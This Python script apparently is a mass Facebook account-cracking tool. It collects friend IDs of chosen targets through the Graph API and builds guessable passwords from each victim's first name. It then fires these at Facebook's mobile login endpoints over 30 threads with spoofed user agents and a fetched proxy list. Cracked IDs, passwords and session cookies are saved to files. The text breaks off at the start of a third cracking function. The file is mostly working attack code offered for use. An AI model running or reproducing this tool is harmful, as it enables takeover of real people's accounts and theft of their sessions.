#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mrenvvv_renvvv')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.1.1','6.0','7.0','7.1.1','7.1.2','8.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-us; Pixel 6 Pro Build/SQ3A.220705.004','en-gb; Pixel 6 Pro Build/SQ3A.220705.004','en-es; Pixel 6 Pro Build/SQ3A.220705.004','en-au; Pixel 6 Pro Build/SQ3A.220705.004','en-id; Pixel 6 Pro Build/SQ3A.220705.004','id-id; Pixel 6 Pro Build/SQ3A.220705.004','zh-tw; Pixel 6 Pro Build/SQ3A.220705.004','zh-cn; Pixel 6 Pro Build/SQ3A.220705.004','fr-fr; Pixel 6 Pro Build/SQ3A.220705.004','pt-pt; Pixel 6 Pro Build/SQ3A.220705.004','in-id; Pixel 6 Pro Build/SQ3A.220705.004','de-de; Pixel 6 Pro Build/SQ3A.220705.004','ja-jp; Pixel 6 Pro Build/SQ3A.220705.004','uk-ua; Pixel 6 Pro Build/SQ3A.220705.004','nl-nl; Pixel 6 Pro Build/SQ3A.220705.004'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,105)
	f='0'
	g=random.randrange(3200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 Instagram'
	j=random.choice(['245.0.0.18.108','180.0.0.31.119','170.0.0.30.474','222.0.0.15.114','29.0.0.13.95'])
	k='Android (33/13; 420dpi; 1080x2219; Google/google; Pixel 6 Pro; oriole; oriole;'
	l=random.choice(['en_US','en_GB','en_ES','en_AU','en_IN','id_ID','zh_TW','zh_CN','fr_FR','pt_PT','in_ID','de_DE','ja_JP','uk_UA','nl_NL'])
	m=random.randrange(99999999,999999999)
	uaku2=f'{aa} {b}; {c}; wv) {d}{e}.{f}.{g}.{h} {i} {j} {k} {l}; {m})'
	ugen.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	print(f"""(+) Simple Crack Facebook\n(+) Made By {M}Indonesian {P}Coder""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([h])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	renv_xy(f'>> Your Id  : '+str(my_id))
	renv_xy(f'>> Your Ip  : {ip}')
	print(f'>> Github   : https://github.com/RENVVV')
	print(f'>> Update   : Version Latest {H}2.0{x} ')
	print('')
	print(f'>> Select Menu{x}')
	print('')
	cetak('[white]1. Crack Public\n0. Exit[white]')
	_____renv__renv_____ = input('\n>> Select : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> input target amount ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		print('>> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> unstable signal ')
			exit()
	try:
		print('')
		print(f'Total Id Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\n{x}>> ID Order Setting ')
	print('')
	print(f'{x}1. Id Old To New ({M}Not Recommend{M}{x}){x} ')
	print(f'2. Id New To Old ({H}Recommended{H}{x}){x}  ')
	print(f'3. Id Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input('Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')
		
	print('\n>> Input Metode URL Login ')
	print('')
	print(f'1. login from {asu}m.facebook.com{x} (slow)')
	print(f'2. login from {asu}mobile.facebook.com{x} (IG)')
	print(f'3. login from {asu}mbasic.facebook.com{x} (semi fast + slow)')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	pwplus=input('>> Add Password Manual ( Y/t ) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f'>> Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'>> Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'>> Play Airplane Mode Every 500 ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append(frs+'123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f'\t{x}>>{k} Good Bye Thanks To Using My Script {x} << ')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s🥶%s🥵/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D2113839472162076%26redirect_uri%3Dhttps%253A%252F%252Fvideo-shorts.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDkXwsl-ruKmeIJ8c__4FDe-vP4P5FL7-1mLHT2yq9zDMKKQj85hgJx7mFF7WbXNCpSRQEkedxu7fszCkDyyYT_z7KPWvEwBzt2-BmlGiMjiC3tdRi0HJE0jfD7-HX4J5OOgdoAJjCB_3nIXbI3hFRBxAQ4ViUCsetr8KNGLqQm7ea1s3WpPQd5MtDf-f1GZE_Y01SKFg01lMJVSDV5LiCFhzUCE10U4W6D6S8IcoIX4UfpDTxr9nhVKFvqKOEYFekOGxCHgvgIcnSJU7B1MzNWN5P4gWne0RX74s0is20mvD2xn9woRIyrtv3qKuH4f0fZnzuxp8cWg9rAp%26scope%3Dpublic_profile%252Cemail%26context_uri%3Dhttps%253A%252F%252Fpublic.app%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8419efaf-4c95-43fc-9ef6-c27dddc4d025%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fvideo-shorts.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDkXwsl-ruKmeIJ8c__4FDe-vP4P5FL7-1mLHT2yq9zDMKKQj85hgJx7mFF7WbXNCpSRQEkedxu7fszCkDyyYT_z7KPWvEwBzt2-BmlGiMjiC3tdRi0HJE0jfD7-HX4J5OOgdoAJjCB_3nIXbI3hFRBxAQ4ViUCsetr8KNGLqQm7ea1s3WpPQd5MtDf-f1GZE_Y01SKFg01lMJVSDV5LiCFhzUCE10U4W6D6S8IcoIX4UfpDTxr9nhVKFvqKOEYFekOGxCHgvgIcnSJU7B1MzNWN5P4gWne0RX74s0is20mvD2xn9woRIyrtv3qKuH4f0fZnzuxp8cWg9rAp%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=2113839472162076&redirect_uri=https%3A%2F%2Fvideo-shorts.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmWRtedLDhMlibiAAAqHuvK3k6RF146mns-Zaq45MUXFufs4p5TPfuqpjaTh-rPEcwT32KBBsX8YC4t95h6oRgvsC1ODc6ZTjqpjNL3uhiguFfdF5TFOAmBBPPnEATkcZhFIQW138bIOA3UpJStXKw9TA_Abecq2LHJlUM9cv2v9lAYSZpbAhM3mYMdBjcD1OtH2faeTh3BmEjkbkLU7b7fT1E8XRuSxC07YGk7h1HCHoXHzq9YXMXxHMlend100Na4greJzxqGM7zrG6t6Ep4SSaBuL14qRrbe5R7Uk12wKeNvVf0LxzxLFJd4cR1aSUMbAyUxAfk-J7Bq&scope=public_profile%2Cemail&context_uri=https%3A%2F%2Fpublic.app&ret=login&fbapp_pres=0&logger_id=e29f15fa-5b58-497e-b235-bfbca8bef82b&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D2113839472162076%26redirect_uri%3Dhttps%253A%252F%252Fvideo-shorts.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDkXwsl-ruKmeIJ8c__4FDe-vP4P5FL7-1mLHT2yq9zDMKKQj85hgJx7mFF7WbXNCpSRQEkedxu7fszCkDyyYT_z7KPWvEwBzt2-BmlGiMjiC3tdRi0HJE0jfD7-HX4J5OOgdoAJjCB_3nIXbI3hFRBxAQ4ViUCsetr8KNGLqQm7ea1s3WpPQd5MtDf-f1GZE_Y01SKFg01lMJVSDV5LiCFhzUCE10U4W6D6S8IcoIX4UfpDTxr9nhVKFvqKOEYFekOGxCHgvgIcnSJU7B1MzNWN5P4gWne0RX74s0is20mvD2xn9woRIyrtv3qKuH4f0fZnzuxp8cWg9rAp%26scope%3Dpublic_profile%252Cemail%26context_uri%3Dhttps%253A%252F%252Fpublic.app%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8419efaf-4c95-43fc-9ef6-c27dddc4d025%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fvideo-shorts.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDkXwsl-ruKmeIJ8c__4FDe-vP4P5FL7-1mLHT2yq9zDMKKQj85hgJx7mFF7WbXNCpSRQEkedxu7fszCkDyyYT_z7KPWvEwBzt2-BmlGiMjiC3tdRi0HJE0jfD7-HX4J5OOgdoAJjCB_3nIXbI3hFRBxAQ4ViUCsetr8KNGLqQm7ea1s3WpPQd5MtDf-f1GZE_Y01SKFg01lMJVSDV5LiCFhzUCE10U4W6D6S8IcoIX4UfpDTxr9nhVKFvqKOEYFekOGxCHgvgIcnSJU7B1MzNWN5P4gWne0RX74s0is20mvD2xn9woRIyrtv3qKuH4f0fZnzuxp8cWg9rAp%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
				print(f'\r{x} * --> {x}{B}{ua}{B}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{H}{kuki}{H}')
				print(f'\r{x} * --> {x}{B}{ua}{B}\n')
				#print(f"{M}{ua}{M}\n")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s💥%s😈/%s 🔥:%s/🤡:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mobile.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mobile.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D933817227433089%26auth_type%26cbt%3D1665297757396%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df187fb1f8b42af8%2526domain%253Dstudio.noice.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fstudio.noice.id%25252Ffc77621ce31584%2526relation%253Dopener%26client_id%3D933817227433089%26display%3Dtouch%26domain%3Dstudio.noice.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fstudio.noice.id%252Flogin%26locale%3Den_US%26logger_id%3Df2cbd6110d5f594%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12422a8ba97ef4%2526domain%253Dstudio.noice.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fstudio.noice.id%25252Ffc77621ce31584%2526relation%253Dopener%2526frame%253Df1ffc769f556c08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12422a8ba97ef4%26domain%3Dstudio.noice.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fstudio.noice.id%252Ffc77621ce31584%26relation%3Dopener%26frame%3Df1ffc769f556c08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mobile.facebook.com/v2.3/dialog/oauth?app_id=933817227433089&auth_type&cbt=1665297798102&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17fa436ac3281%26domain%3Dstudio.noice.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fstudio.noice.id%252Ffc77621ce31584%26relation%3Dopener&client_id=933817227433089&display=touch&domain=studio.noice.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fstudio.noice.id%2Flogin&locale=en_US&logger_id=f1d4171e56d43a8&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df249681d1ae7e84%26domain%3Dstudio.noice.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fstudio.noice.id%252Ffc77621ce31584%26relation%3Dopener%26frame%3Df3ef70e9e24a11c&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=false&scope=public_profile%2Cemail&sdk=joey&version=v2.3&ret=login&fbapp_pres=0&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mobile.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mobile.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mobile.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D933817227433089%26auth_type%26cbt%3D1665297757396%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df187fb1f8b42af8%2526domain%253Dstudio.noice.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fstudio.noice.id%25252Ffc77621ce31584%2526relation%253Dopener%26client_id%3D933817227433089%26display%3Dtouch%26domain%3Dstudio.noice.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fstudio.noice.id%252Flogin%26locale%3Den_US%26logger_id%3Df2cbd6110d5f594%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12422a8ba97ef4%2526domain%253Dstudio.noice.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fstudio.noice.id%25252Ffc77621ce31584%2526relation%253Dopener%2526frame%253Df1ffc769f556c08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12422a8ba97ef4%26domain%3Dstudio.noice.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fstudio.noice.id%252Ffc77621ce31584%26relation%3Dopener%26frame%3Df1ffc769f556c08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mobile.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
				print(f'\r{x} * --> {x}{B}{ua}{B}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{H}{kuki}{H}')
				print(f'\r{x} * --> {x}{B}{ua}{B}\n')
				#print(f"{M}{ua}{M}\n")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
